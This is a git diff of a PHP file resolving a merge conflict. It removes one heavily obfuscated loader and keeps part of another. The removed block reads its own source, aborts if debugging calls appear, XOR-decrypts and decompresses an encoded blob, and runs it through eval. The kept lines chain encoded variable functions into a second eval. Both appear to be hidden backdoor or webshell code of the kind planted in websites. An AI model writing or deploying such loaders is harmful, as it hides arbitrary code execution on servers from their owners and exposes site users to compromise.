@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$sdpkvhscl="7f68921d8b48889b0ff3533079334e4a";
-$iyhwgkub="0350570b0f50575659560d01005b5b070005045004005051025d510302030450";
-$hxjafzsbtc="TOwcYFsJpAJxyhfBJ217vbo+E/huBXf9jykyNtxgknKGwLW/Ek8PiFDyx8KqxZcA436fM8OPv/KOMnK+fyoytXoqTomnMlRQbVGLoTxxM0G7ykY3FASGM4yAtVrTdOQRD7Qv+596BS4oobWbKFCKywP7XL8MPuKygEDodjQwAtN0OhgaG5la7KXUDaP4y6KhBSHdP2MUP94ByqkGATODFfxvAVvWo1X3bhS1eOYGqXuqTbKTRfCAOD/CDW9UL++4dm7EEf4M1nTUK5J+LBI+rv2g+1mi96P+5eabewDJMsDJGmIHi6SjB72XwywJcIXyWaL7ueH3COaaOhm1HL5EKUdAJWCjKxnqjnr0gf/swac8faXezysNBpVMJdjDQW0pOnDiGmpUTQliwxnjEvEq5z1buWMVGqHZztPREV8OMmtMaMRS4z6SogOzCQ7kdFHvc7/2snCYbshRRWRKT6ixkm8JQ2JiU1qX09QG+x2GBpiPX8X/A9I1fN+LoJn6Wt60xEYsGEO6FdP4SIJUhQlfOH43mNUFiUDfUf1ozUX7Omf0SSPeeZ+d6vbigeOlKjbMJFPNhZr62XROTv6EvRhOMSAweLA=";
-$ualhnuu=file_get_contents(__FILE__);
-$aziymjxpk=str_replace($hxjafzsbtc,"",$ualhnuu);
-if(strpos($aziymjxpk,"ec"."ho")!==false||strpos($aziymjxpk,"pr"."int")!==false||strpos($aziymjxpk,"var_"."dump")!==false||strpos($aziymjxpk,"file_put_"."contents")!==false||strpos($aziymjxpk,"fw"."rite")!==false){die();}
-$mblcswpqe=str_replace(array($sdpkvhscl,$iyhwgkub),array("SP_18bb45ec","KP_70f7bd82"),$ualhnuu);
-$wlryneja=md5($mblcswpqe);
-$velyakyyb=hex2bin($iyhwgkub);
-$jniwyc="";
-$tvoamgart=strlen($wlryneja);
-for($zwcaqhyzbhz=0;$zwcaqhyzbhz<$tvoamgart;$zwcaqhyzbhz++){
-$jniwyc.=chr(ord($velyakyyb[$zwcaqhyzbhz])^ord($wlryneja[$zwcaqhyzbhz]));
-}
-$fckocro=base64_decode($hxjafzsbtc);
-$zwhbjjnfys=strlen($fckocro);
-$xppptuqa="";
-$ixvsmat=strlen($jniwyc);
-for($zwcaqhyzbhz=0;$zwcaqhyzbhz<$zwhbjjnfys;$zwcaqhyzbhz++){
-$xppptuqa.=$fckocro[$zwcaqhyzbhz]^$jniwyc[$zwcaqhyzbhz%$ixvsmat];
-}
-$qwfbxevdel="gzun"."compress";
-eval($qwfbxevdel($xppptuqa));
-=======
 // b400aa2066bee0cb5a67bd3b
 $oNyKjoccSEOPy="nycBImLh9DSla5yN1Olj8vdD6IXLhmL9BITgCBS/ovE=";
 $HcgUcYmTUz="alpOVzYu9QFyn5lA1Byw8iqQ6VKYuzY9OVGtPOF/biR=";
@@ -52,4 +27,3 @@ $ocmLSIcoupf=$jdCjNsj_K($ocmLSIcoupf);
 $ocmLSIcoupf=$IBOSzHxqxfJg($ocmLSIcoupf);
 $ocmLSIcoupf=$EtEBsDEdpoDtvuKJ($ocmLSIcoupf);
 eval($ocmLSIcoupf);
->>>>>>> Stashed changes
